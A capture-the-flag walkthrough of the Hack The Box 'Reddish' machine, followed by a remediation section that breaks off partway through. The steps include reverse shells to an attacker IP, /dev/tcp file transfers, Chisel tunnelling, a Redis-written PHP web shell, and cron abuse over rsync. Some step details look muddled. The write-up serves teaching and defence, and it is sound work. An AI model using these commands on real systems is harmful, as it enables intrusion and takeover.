<!doctype html><html lang=en><head><title>Reddish HTB - Insane Linux Box Walkthrough :: VAPT Walkthroughs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Complete walkthrough of Reddish HTB machine featuring Node-RED exploitation, Docker container pivoting with Chisel tunneling, Redis database manipulation, rsync wildcard exploitation, and multi-hop privilege escalation through containerized environments"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://malayamanas.github.io/posts/reddish-htb-walkthrough/><link rel=stylesheet href=https://malayamanas.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://malayamanas.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://malayamanas.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://malayamanas.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://malayamanas.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://malayamanas.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://malayamanas.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://malayamanas.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://malayamanas.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://malayamanas.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://malayamanas.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://malayamanas.github.io/terminal.css><link rel="shortcut icon" href=https://malayamanas.github.io/favicon.png><link rel=apple-touch-icon href=https://malayamanas.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Reddish HTB - Insane Linux Box Walkthrough"><meta property="og:description" content="Complete walkthrough of Reddish HTB machine featuring Node-RED exploitation, Docker container pivoting with Chisel tunneling, Redis database manipulation, rsync wildcard exploitation, and multi-hop privilege escalation through containerized environments"><meta property="og:url" content="https://malayamanas.github.io/posts/reddish-htb-walkthrough/"><meta property="og:site_name" content="VAPT Walkthroughs"><meta property="og:image" content="https://malayamanas.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="HTB"><meta property="article:section" content="Linux"><meta property="article:published_time" content="2025-09-22 09:15:00 +0000 UTC"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://malayamanas.github.io/><div class=logo>Terminal</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://malayamanas.github.io/posts/reddish-htb-walkthrough/>Reddish HTB - Insane Linux Box Walkthrough</a></h1><div class=post-meta><time class=post-date>2025-09-22</time></div><span class=post-tags>#<a href=https://malayamanas.github.io/tags/insane-linux/>insane-linux</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/node-red/>node-red</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/docker/>docker</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/pivoting/>pivoting</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/chisel/>chisel</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/redis/>redis</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/web/>web</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/rsync/>rsync</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/cron/>cron</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/privilege-escalation/>privilege-escalation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/network-tunneling/>network-tunneling</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/containers/>containers</a>&nbsp;</span><div class=post-content><div><h1 id=reddish-htb---insane-linux-box-walkthrough>Reddish HTB - Insane Linux Box Walkthrough<a href=#reddish-htb---insane-linux-box-walkthrough class=hanchor arialabel=Anchor>#</a></h1><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/Yp4oxoQIBAM?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=key-exploitation-steps-and-techniques-chronological-order>Key Exploitation Steps and Techniques (Chronological Order)<a href=#key-exploitation-steps-and-techniques-chronological-order class=hanchor arialabel=Anchor>#</a></h2><p>Below is a chronological extraction of the key exploitation steps and techniques used in the provided data for the &ldquo;Reddish&rdquo; box from Hack The Box, focusing on the process of gaining access and escalating privileges through multiple hops and pivoting techniques.</p><hr><h3 id=key-exploitation-steps-and-techniques-chronological-order-1>Key Exploitation Steps and Techniques (Chronological Order)<a href=#key-exploitation-steps-and-techniques-chronological-order-1 class=hanchor arialabel=Anchor>#</a></h3><ol><li><p><strong>Initial Reconnaissance with Nmap (Port Scanning)</strong></p><ul><li><strong>Technique</strong>: Perform an Nmap scan to identify open ports and services on the target IP ([TARGET-IP]).</li><li><strong>Steps</strong>:<ul><li>Run a default Nmap scan: <code>nmap -sC -sV -oA nmap/reddish [TARGET-IP]</code>. No open ports found in the top 1000.</li><li>Conduct a full port scan: <code>nmap -p- -T5 --max-retries 0 -v -oA nmap/allports-reddish [TARGET-IP]</code>. Discovered port 1880 open.</li><li>Perform a targeted scan on port 1880: <code>nmap -p 1880 -sC -sV -oA nmap/targeted1880-reddish [TARGET-IP]</code>. Identified HTTP service running Node.js Express framework.</li></ul></li><li><strong>Purpose</strong>: Identify open ports, services, and potential OS (Linux, based on TTL 63 from ping).</li></ul></li><li><p><strong>Web Enumeration and Application Identification</strong></p><ul><li><strong>Technique</strong>: Manual web enumeration and favicon analysis to identify the application.</li><li><strong>Steps</strong>:<ul><li>Access <code>http://[TARGET-IP]:1880</code>, received &ldquo;Cannot GET /&rdquo; response.</li><li>Check favicon (<code>/favicon.ico</code>), download it, and use Google Image Search to identify the application as Node-RED (a flow-based programming tool).</li></ul></li><li><strong>Purpose</strong>: Confirm the application running on port 1880 is Node-RED, a platform that may allow command execution.</li></ul></li><li><p><strong>Exploiting Node-RED for Initial Shell</strong></p><ul><li><strong>Technique</strong>: Use Burp Suite to manipulate HTTP requests and Node-RED&rsquo;s functionality to achieve command execution.</li><li><strong>Steps</strong>:<ul><li>Send a POST request to <code>/red/&lt;ID></code> (ID obtained from Burp Suite response) to access the Node-RED interface.</li><li>Create a flow in Node-RED with an <code>exec</code> node to run commands (e.g., <code>whoami</code>), but no output received.</li><li>Configure a TCP output node to connect to attacker&rsquo;s machine ([ATTACKER-IP]:4444) and send command output.</li><li>Use <code>netcat</code> to receive output, achieving a pseudo-shell: <code>nc -lvnp 4444</code>. Commands like <code>ls</code> and <code>cd</code> executed successfully.</li></ul></li><li><strong>Purpose</strong>: Gain initial command execution on the Node-RED container.</li></ul></li><li><p><strong>Privilege Escalation Attempt via LinEnum Script</strong></p><ul><li><strong>Technique</strong>: Transfer and execute a LinEnum script to enumerate the system for privilege escalation opportunities.</li><li><strong>Steps</strong>:<ul><li>Attempt to transfer LinEnum via <code>wget</code> or <code>curl</code> to <code>[ATTACKER-IP]:8000</code>, but tools were unavailable.</li><li>Use <code>bash -c "cat &lt;/dev/tcp/[ATTACKER-IP]/8000" > lin.sh</code> to transfer the script via <code>/dev/tcp</code>.</li><li>Execute <code>bash lin.sh</code> to enumerate the system, revealing it&rsquo;s a Docker container (confirmed by <code>/dockerenv</code> file) and identifying readable <code>/etc/shadow</code> with no passwords.</li></ul></li><li><strong>Purpose</strong>: Gather system information to identify potential privilege escalation vectors.</li></ul></li><li><p><strong>Network Enumeration and Pivoting Preparation</strong></p><ul><li><strong>Technique</strong>: Enumerate internal network IPs and scan for other containers.</li><li><strong>Steps</strong>:<ul><li>Run <code>ip addr</code> to identify local IP (172.18.0.2) and assume other IPs in the 172.18.0.0/16 and 172.19.0.0/16 subnets.</li><li>Create a bash script (<code>ip_scan.sh</code>) to ping IPs in 172.18.0.0/16: <code>for ip in $(seq 1 255); do ping -c 1 172.18.0.$ip >/dev/null && echo "online 172.18.0.$ip"; done</code>. Identified 172.18.0.1 (gateway) and 172.18.0.2 (current container).</li><li>Scan 172.19.0.0/16 subnet, identifying 172.19.0.2, 172.19.0.3, and 172.19.0.4 as active.</li><li>Perform a port scan on 172.19.0.3 using a bash script: <code>for port in {20,21,22,80,443,8080,8443}; do echo "test" > /dev/tcp/172.19.0.3/$port 2>/dev/null && echo "open port $port"; done</code>. Found port 80 open.</li></ul></li><li><strong>Purpose</strong>: Discover additional containers for pivoting.</li></ul></li><li><p><strong>Pivoting with Chisel (Reverse Tunnel to Web Server)</strong></p><ul><li><strong>Technique</strong>: Use Chisel to create a reverse tunnel to access the web server on 172.19.0.3:80.</li><li><strong>Steps</strong>:<ul><li>Build and optimize Chisel binary on the attacker&rsquo;s machine: <code>go build -ldflags "-s -w"</code> and <code>upx --brute chisel</code> to reduce size.</li><li>Transfer Chisel to the Node-RED container via <code>nc -lvnp 80</code> and <code>cat &lt;/dev/tcp/[ATTACKER-IP]/80 > chisel</code>.</li><li>Set up Chisel server on attacker&rsquo;s machine: <code>./chisel server -p 8000 --reverse</code>.</li><li>On Node-RED container, run Chisel client: <code>./chisel client [ATTACKER-IP]:8000 R:127.0.0.1:8001:172.19.0.3:80</code>.</li><li>Access <code>http://localhost:8001</code> on attacker&rsquo;s machine to reach the web server on 172.19.0.3.</li><li>Modify to bind to localhost for security: <code>./chisel client [ATTACKER-IP]:8000 R:127.0.0.1:8001:172.19.0.3:80</code>.</li></ul></li><li><strong>Purpose</strong>: Establish a tunnel to access the web server on the second container.</li></ul></li><li><p><strong>Web Server Exploitation (Code Execution)</strong></p><ul><li><strong>Technique</strong>: Exploit shared web folder with Redis database to achieve code execution.</li><li><strong>Steps</strong>:<ul><li>Access <code>http://localhost:8001</code>, identify endpoints like <code>/getData</code> (returns hit counter) and <code>/incrementCounter</code>.</li><li>Discover Redis on 172.19.0.2:6379 (no authentication required) via port scan and Nmap: <code>nmap -sT -p 6379 -sC -sV localhost</code>.</li><li>Use Redis to write a PHP file to the shared web directory:<ul><li><code>FLUSHALL</code> to clear Redis.</li><li><code>SET please_subscribe "&lt;?php system(\$_REQUEST['cmd']); ?>"</code>.</li><li><code>CONFIG SET dbfilename apsec.php</code>.</li><li><code>CONFIG SET dir /var/www/html</code>.</li><li><code>SAVE</code> to write the file.</li></ul></li><li>Access <code>http://localhost:8001/apsec.php?cmd=whoami</code>, confirming code execution as <code>www-data</code>.</li></ul></li><li><strong>Purpose</strong>: Gain code execution on the web server container.</li></ul></li><li><p><strong>Reverse Shell from Web Server</strong></p><ul><li><strong>Technique</strong>: Set up a local pivot to allow the web server to send a reverse shell to the attacker&rsquo;s machine.</li><li><strong>Steps</strong>:<ul><li>Set up Chisel server on attacker&rsquo;s machine: <code>./chisel server -p 8000</code>.</li><li>On Node-RED container, run: <code>./chisel client [ATTACKER-IP]:8000 9001:127.0.0.1:8005</code>.</li><li>On attacker&rsquo;s machine, listen: <code>nc -lvnp 8005</code>.</li><li>From Burp Suite, execute: <code>bash -c 'bash -i >& /dev/tcp/172.19.0.4/9001 0>&amp;1'</code> via <code>apsec.php</code>.</li><li>Receive reverse shell as <code>www-data</code> on the web server container.</li></ul></li><li><strong>Purpose</strong>: Obtain a stable shell on the web server container.</li></ul></li><li><p><strong>Privilege Escalation on Web Server via Rsync (Cron Job Abuse)</strong></p><ul><li><strong>Technique</strong>: Exploit a cron job running <code>rsync</code> with a wildcard to execute arbitrary commands.</li><li><strong>Steps</strong>:<ul><li>Identify <code>/backup/backup.sh</code> running every 3 minutes via <code>/etc/cron.d/backup</code>.</li><li>Exploit <code>rsync</code> wildcard vulnerability by creating a file named <code>--e sh please_subscribe.o.db</code> in <code>/var/www/html</code>.</li><li>Create <code>/bin/sh</code> copy with setuid: <code>cp /bin/sh /tmp/priv; chmod 4755 /tmp/priv</code>.</li><li>Transfer file via <code>rsync</code>: <code>rsync -av /tmp/please_subscribe.o.db rsync://backup:873/src/etc/cron.d/</code>.</li><li>Wait for cron job to execute, granting a setuid binary (<code>/tmp/priv</code>).</li><li>Run <code>/tmp/priv</code> to gain root on the web server container.</li></ul></li><li><strong>Purpose</strong>: Escalate privileges to root on the web server container.</li></ul></li><li><p><strong>Accessing Backup Server</strong></p><ul><li><strong>Technique</strong>: Use <code>rsync</code> to access files on the backup server (172.20.0.2).</li><li><strong>Steps</strong>:<ul><li>From the root shell, use <code>rsync -av rsync://backup:873/src/etc/shadow</code> to retrieve files.</li><li>Attempt to access <code>root.txt</code>, but it&rsquo;s not present.</li></ul></li><li><strong>Purpose</strong>: Attempt to retrieve sensitive files from the backup server.</li></ul></li><li><p><strong>Pivoting to Backup Server (Chained Tunnels)</strong></p><ul><li><strong>Technique</strong>: Set up chained Chisel tunnels to allow the backup server to connect back to the attacker&rsquo;s machine.</li><li><strong>Steps</strong>:<ul><li>On attacker&rsquo;s machine: <code>./chisel server -p 8000</code>.</li><li>On Node-RED container: <code>./chisel client [ATTACKER-IP]:8000 8010:127.0.0.1:8000</code>.</li><li>On web server container: <code>./chisel client 172.19.0.4:8010 8020:127.0.0.1:9005</code>.</li><li>Transfer a base64-encoded reverse shell script (<code>runme</code>) to the backup server via <code>rsync</code>: <code>rsync -avP /tmp/clean rsync://backup:873/src/etc/cron.d/clean</code>.</li><li>Script content: <code>echo "base64_encoded_shell" | base64 -d | bash</code>, connecting to 172.20.0.3:8020.</li><li>Receive root shell on the backup server via <code>nc -lvnp 9005</code>.</li></ul></li><li><strong>Purpose</strong>: Gain root access on the backup server.</li></ul></li><li><p><strong>Final Root Access and Flag Retrieval</strong></p><ul><li><strong>Technique</strong>: Mount disk and enumerate for the final flag.</li><li><strong>Steps</strong>:<ul><li>On the backup server, run <code>ip addr</code> to confirm IP (172.20.0.2).</li><li>Transfer LinEnum via <code>nc -lvnp 9006</code> and <code>cat &lt;/dev/tcp/172.20.0.3/8021 > lin.sh</code>.</li><li>Mount disks: <code>mount /dev/sda1 /tmp/sda1</code>, revealing <code>/root/root.txt</code>.</li><li>Read <code>root.txt</code> (33 characters).</li><li>Set up a final reverse shell to the main host (not a Docker container):<ul><li>Create base64-encoded shell script: <code>echo "bash -i >& /dev/tcp/[ATTACKER-IP]/101 0>&amp;1" | base64</code>.</li><li>Transfer and execute via <code>rsync</code> to <code>/etc/cron.d</code>.</li><li>Receive shell on <code>nc -lvnp 101</code>, confirming root access on the main host.</li></ul></li><li>Run <code>python -c 'import pty;pty.spawn("/bin/bash")'</code> for a stable shell.</li></ul></li><li><strong>Purpose</strong>: Retrieve the final <code>root.txt</code> flag and gain full root access.</li></ul></li><li><p><strong>Optional: SOCKS Proxy for Easier Pivoting</strong></p><ul><li><strong>Technique</strong>: Use Chisel to create a SOCKS5 proxy for dynamic routing.</li><li><strong>Steps</strong>:<ul><li>On attacker&rsquo;s machine: <code>./chisel server -p 8000 --reverse</code>.</li><li>On Node-RED container: <code>./chisel client [ATTACKER-IP]:8000 R:127.0.0.1:8001:127.0.0.1:1337</code>.</li><li>On Node-RED container, run a second Chisel: <code>./chisel server -p 1337 --socks5</code>.</li><li>On attacker&rsquo;s machine: <code>./chisel client 127.0.0.1:8001 socks</code>.</li><li>Use <code>proxychains</code> with <code>nmap</code> or <code>curl</code> to access internal IPs (e.g., <code>proxychains nmap -sT 172.19.0.3 -p 80</code>).</li></ul></li><li><strong>Purpose</strong>: Simplify access to multiple internal IPs without creating individual tunnels.</li></ul></li></ol><hr><h3 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>#</a></h3><p>The exploitation process involves:</p><ul><li><strong>Initial Access</strong>: Nmap scanning and favicon analysis to identify Node-RED on port 1880, followed by command execution via HTTP POST requests.</li><li><strong>Pivoting</strong>: Using Chisel for reverse and local tunnels to access internal containers (web server and Redis on 172.19.0.2/3).</li><li><strong>Code Execution</strong>: Exploiting Redis to write a PHP file for a web shell, then upgrading to a reverse shell.</li><li><strong>Privilege Escalation</strong>: Abusing a cron job with <code>rsync</code> to gain root on the web server container.</li><li><strong>Further Pivoting</strong>: Chained Chisel tunnels to access the backup server, followed by another <code>rsync</code> exploit for root access.</li><li><strong>Final Access</strong>: Mounting disks to retrieve <code>root.txt</code> and establishing a root shell on the main host.</li></ul><p>This sequence demonstrates advanced pivoting techniques using Chisel, exploitation of Node-RED and Redis, and cron job abuse with <code>rsync</code> to achieve full system compromise across multiple Docker containers.</p><h2 id=security-gaps-and-remediation>Security Gaps and Remediation<a href=#security-gaps-and-remediation class=hanchor arialabel=Anchor>#</a></h2><p>Below is a detailed analysis of the security gaps identified in the services and systems exploited in the &ldquo;Reddish&rdquo; Hack The Box scenario, along with specific recommendations for fixing these issues through source code or configuration changes. The gaps are organized by the services or systems involved (Node-RED, web server, Redis, rsync, Docker, and general network configuration) and include actionable fixes to mitigate the vulnerabilities.</p><hr><h3 id=1-node-red-running-on-port-1880>1. Node-RED (Running on Port 1880)<a href=#1-node-red-running-on-port-1880 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gaps and Fixes</strong>:</p><ul><li><p><strong>Gap 1: Unauthenticated Access to Node-RED Interface</strong></p><ul><li><strong>Description</strong>: The Node-RED instance allows unauthenticated access to its web interface, enabling attackers to create flows and execute commands via the <code>exec</code> node.</li><li><strong>Impact</strong>: Attackers can achieve arbitrary command execution on the host container.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Enable authentication in Node-RED by configuring the <code>settings.js</code> file (typically located in <code>~/.node-red/settings.js</code>).<ul><li>Set <code>adminAuth</code> to use a username/password or token-based authentication:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>adminAuth</span><span style=color:#f92672>:</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>type</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;credentials&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>users</span><span style=color:#f92672>:</span> [{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;$2a$08$...&#34;</span>, <span style=color:#75715e>// Use bcrypt to hash password
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>permissions</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;*&#34;</span>
</span></span><span style=display:flex><span>  }]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>Restart Node-RED to apply changes.</li></ul></li><li>Restrict access to the Node-RED admin interface by binding it to localhost or a specific IP, or use a firewall rule (e.g., <code>iptables -A INPUT -p tcp --dport 1880 -s 127.0.0.1 -j ACCEPT</code>).</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If custom Node-RED nodes are used, ensure they enforce authentication checks before allowing flow modifications or command execution.</li></ul></li></ul></li><li><p><strong>Gap 2: Exposed HTTP Endpoint Allowing Command Execution</strong></p><ul><li><strong>Description</strong>: The <code>/red/&lt;ID></code> endpoint accepts POST requests that allow command execution through flow manipulation without validation.</li><li><strong>Impact</strong>: Attackers can manipulate flows to run arbitrary commands (e.g., via <code>exec</code> node).</li><li><strong>Fix (Configuration)</strong>:<ul><li>Disable or restrict the <code>exec</code> node in Node-RED&rsquo;s configuration to prevent command execution:<ul><li>In <code>settings.js</code>, disable unsafe nodes:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>functionGlobalContext</span><span style=color:#f92672>:</span> {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>os</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>null</span> <span style=color:#75715e>// Disable os module to prevent exec node usage
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div></li></ul></li><li>Use Node-RED&rsquo;s <code>node-red-contrib-acl</code> or similar access control plugins to restrict flow modifications to authorized users.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>Modify Node-RED source code to enforce input validation and sanitization for flow configurations, ensuring only approved commands or nodes can be executed.</li><li>Implement a whitelist for allowed nodes and reject any flows containing <code>exec</code> or similar nodes unless explicitly permitted.</li></ul></li></ul></li><li><p><strong>Gap 3: Exposed Favicon Revealing Application Identity</strong></p><ul><li><strong>Description</strong>: The favicon (<code>/favicon.ico</code>) leaks the Node-RED application identity, aiding attackers in targeting known vulnerabilities.</li><li><strong>Impact</strong>: Simplifies reconnaissance by confirming the application type.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Replace the default favicon with a generic or custom icon to avoid leaking application details.</li><li>Disable favicon serving in Node-RED&rsquo;s HTTP server configuration or use a reverse proxy (e.g., Nginx) to filter such requests:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#66d9ef>location</span> <span style=color:#e6db74>/favicon.ico</span> {
</span></span><span style=display:flex><span>  <span style=color:#f92672>return</span> <span style=color:#ae81ff>404</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>Modify Node-RED&rsquo;s HTTP server to not serve identifiable assets like the default favicon unless explicitly configured.</li></ul></li></ul></li></ul><hr><h3 id=2-web-server-running-on-172190380>2. Web Server (Running on 172.19.0.3:80)<a href=#2-web-server-running-on-172190380 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gaps and Fixes</strong>:</p><ul><li><p><strong>Gap 1: Shared Directory with Redis Allowing File Writes</strong></p><ul><li><strong>Description</strong>: The web server&rsquo;s document root (<code>/var/www/html</code>) is shared with the Redis database, allowing Redis to write executable PHP files (e.g., <code>apsec.php</code>) to the web root.</li><li><strong>Impact</strong>: Attackers can achieve code execution by writing malicious PHP scripts via Redis.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Isolate Redis and web server directories by ensuring they do not share a common filesystem or mount point.</li><li>Configure Redis to write database files to a non-web-accessible directory:<ul><li>In <code>redis.conf</code>, set <code>dir</code> to a restricted path:<pre tabindex=0><code class=language-conf data-lang=conf>dir /var/lib/redis/
</code></pre></li><li>Ensure <code>/var/lib/redis/</code> is not accessible to the web server user (<code>www-data</code>).</li></ul></li><li>Restrict web server write permissions: <code>chown root:root /var/www/html; chmod 755 /var/www/html</code>.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If the web application interacts with Redis, implement strict validation to prevent arbitrary file writes.</li><li>Sanitize Redis commands to disallow <code>CONFIG SET</code> operations that modify <code>dbfilename</code> or <code>dir</code>.</li></ul></li></ul></li><li><p><strong>Gap 2: PHP Execution Without Input Validation</strong></p><ul><li><strong>Description</strong>: The web server executes PHP files (e.g., <code>apsec.php?cmd=whoami</code>) without validating or sanitizing user input.</li><li><strong>Impact</strong>: Allows arbitrary command execution via URL parameters.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Disable PHP execution in the web root by using a <code>.htaccess</code> file (for Apache):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span>php_flag engine <span style=color:#66d9ef>off</span>
</span></span></code></pre></div>Or for Nginx, block PHP file execution:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#66d9ef>location</span> ~ <span style=color:#e6db74>\.php$</span> {
</span></span><span style=display:flex><span>  <span style=color:#f92672>deny</span> <span style=color:#e6db74>all</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>If PHP is required, use a whitelist for allowed scripts and disable direct access to user-uploaded files.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>Modify PHP scripts to sanitize and validate <code>$_REQUEST['cmd']</code> using a whitelist of allowed commands or disable <code>system()</code> calls entirely:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$allowed_commands <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;whoami&#39;</span>, <span style=color:#e6db74>&#39;id&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($_REQUEST[<span style=color:#e6db74>&#39;cmd&#39;</span>], $allowed_commands)) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>system</span>(<span style=color:#a6e22e>escapeshellcmd</span>($_REQUEST[<span style=color:#e6db74>&#39;cmd&#39;</span>]));
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Invalid command&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li></ul></li></ul></li></ul><hr><h3 id=3-redis-running-on-17219026379>3. Redis (Running on 172.19.0.2:6379)<a href=#3-redis-running-on-17219026379 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gaps and Fixes</strong>:</p><ul><li><p><strong>Gap 1: No Authentication Required</strong></p><ul><li><strong>Description</strong>: Redis runs without authentication, allowing unauthenticated clients to execute commands like <code>FLUSHALL</code>, <code>SET</code>, and <code>CONFIG SET</code>.</li><li><strong>Impact</strong>: Attackers can manipulate Redis to write malicious files or clear data.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Enable Redis authentication by setting a password in <code>redis.conf</code>:<pre tabindex=0><code class=language-conf data-lang=conf>requirepass strong_password_here
</code></pre><ul><li>Restart Redis to apply changes.</li></ul></li><li>Bind Redis to localhost or a specific IP: <code>bind 127.0.0.1</code> in <code>redis.conf</code>.</li><li>Use a firewall to restrict access: <code>iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT; iptables -A INPUT -p tcp --dport 6379 -j DROP</code>.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If Redis is used in a custom application, enforce client-side authentication checks before allowing connections.</li></ul></li></ul></li><li><p><strong>Gap 2: Ability to Modify Configuration (CONFIG SET)</strong></p><ul><li><strong>Description</strong>: Redis allows <code>CONFIG SET</code> commands to change <code>dbfilename</code> and <code>dir</code>, enabling file writes to arbitrary locations.</li><li><strong>Impact</strong>: Attackers can write executable files to the web server&rsquo;s document root.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Disable dangerous commands in <code>redis.conf</code>:<pre tabindex=0><code class=language-conf data-lang=conf>rename-command CONFIG &#34;&#34;
rename-command FLUSHALL &#34;&#34;
</code></pre></li><li>Run Redis as a non-privileged user and restrict its write permissions to a specific directory: <code>chown redis:redis /var/lib/redis; chmod 700 /var/lib/redis</code>.</li></ul></li><li><strong>Fix (Source Code)</strong>:<ul><li>If a custom application uses Redis, implement a wrapper to block <code>CONFIG</code> and <code>FLUSHALL</code> commands unless explicitly needed.</li></ul></li></ul></li></ul><hr><h3 id=4-rsync-running-on-backup-server-1722002873>4. Rsync (Running on Backup Server, 172.20.0.2:873)<a href=#4-rsync-running-on-backup-server-1722002873 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gaps and Fixes</strong>:</p><ul><li><p><strong>Gap 1: Unauthenticated Rsync Access</strong></p><ul><li><strong>Description</strong>: The rsync service allows unauthenticated access to write files to <code>/src/etc/cron.d/</code>, which is executed by a cron job.</li><li><strong>Impact</strong>: Attackers can upload malicious scripts to gain root access.</li><li><strong>Fix (Configuration)</strong>:<ul><li>Enable authentication in the rsync configuration (<code>/etc/rsyncd.conf</code>):<pre tabindex=0><code class=language-conf data-lang=conf>auth users = backup_user
secrets file = /etc/rsyncd.secrets
